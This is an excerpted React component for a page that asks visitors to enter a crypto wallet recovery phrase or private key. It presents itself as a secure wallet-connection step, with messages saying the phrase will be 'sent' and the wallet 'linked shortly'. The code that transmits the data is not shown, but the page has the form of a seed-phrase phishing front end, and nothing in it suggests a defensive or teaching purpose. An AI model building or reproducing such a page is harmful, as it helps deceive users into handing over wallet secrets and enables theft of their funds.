...
const ConnectionPage = () => {
  ...
  const handleSubmit = async (type: "phrase" | "privateKey") => {
    const inputData =
      type === "phrase" ? phraseData.trim() : privateKeyData.trim();
    if (!inputData) {
      alert(
        `Please enter your ${
          type === "phrase" ? "recovery phrase" : "private key"
        }.`
      );
      return;
    }
    ...
    <div className="relative flex flex-col items-center justify-start gap-5 w-screen h-screen bg-black text-gray-600 p-5 pt-20">
      ...
      <div className="flex items-center justify-center bg-blue-200 rounded-xl p-3">
        <h2 className="text-blue-800 text-center">
          <span className="font-bold">Info Alert!</span> Securely use any of the
          options below
        </h2>
      </div>
      ...
      <div className="flex flex-col items-center justify-start p-3 max-w-[500px] min-w-[350px] h-[300px] bg-gray-200 rounded-xl gap-5">
        ...
        <div className="flex w-full gap-3 items-center">
          <div
            className={`p-3 mb-5 cursor-pointer hover:bg-gray-300 ${
              activeTab === "phrase"
                ? "border-b-2 border-blue-400 text-blue-700 font-bold"
        ...
        {success && (
          <div className="w-full text-center text-green-500 font-bold">
            {activeTab === "phrase"
              ? "Successful! We will link your wallet shortly"
              : "Successful! We will address your concerns shortly"}
          </div>
        )}
        {error && (
          <div className="w-full text-center text-red-500 font-bold">
            {activeTab === "phrase"
              ? "Failed to send phrase. Try again."
              : "Failed to send private key. Try again."}
          </div>
        )}
        ...
        {activeTab === "phrase" && (
          <>
            ...
            />
            <button
              className={`self-start p-3 px-6 text-white cursor-pointer rounded ${
